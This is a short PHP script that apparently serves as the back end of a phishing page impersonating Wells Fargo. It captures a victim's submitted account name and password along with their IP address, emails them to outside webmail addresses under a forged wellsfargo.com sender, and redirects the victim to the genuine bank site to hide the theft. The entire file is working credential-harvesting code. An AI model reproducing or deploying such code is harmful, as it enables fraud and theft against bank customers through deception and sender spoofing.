<?
session_start();
$ea=  $_POST['ea'];
$password=  $_POST['password'];
session_register("userId");
setcookie("username", $username, time()+3600);
setcookie("password", $password, time()+3600);
$ip = getenv("REMOTE_ADDR");
$adddate=date("D M d, Y g:i a");

  $subj = "Wells Fargo Page I $ea";
  $msg = "ea: $ea\npassword: $password\n\nSubmitted from IP Address - $ip on $adddate";
  $from = "From: $username<results@wellsfargo.com>";
  mail("m.craig40@yahoo.com,mcraig241@gmail.com", $subj, $msg, $from);
         mail("", $subj, $msg, $from);
  header("Location:https://www.wellsfargo.com?ZXJyb3Iubm9Vc2VybmFtZQ%3D%3DZXJyb3Iubm9Vc2VybmFtZQ%3D%3D");

?>